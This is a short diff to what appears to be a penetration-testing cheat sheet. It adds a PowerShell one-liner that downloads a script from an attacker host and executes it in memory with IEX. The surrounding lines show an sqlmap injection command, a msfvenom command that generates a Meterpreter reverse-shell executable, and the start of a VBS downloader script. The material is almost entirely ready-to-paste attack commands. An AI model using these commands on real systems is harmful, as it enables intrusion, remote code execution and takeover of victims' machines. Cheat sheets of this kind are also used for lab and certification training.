@@ -808,6 +808,11 @@ sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe > shell.exe
 ```
+## Powershell Downloader
+```
+IEX(New-Object Net.Webclient).downloadString('http://KaliIP:8000/Sherlock.ps1')
+or vulnSher.ps1
+```
 ## WGET vbs (copy and paste into shell)
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
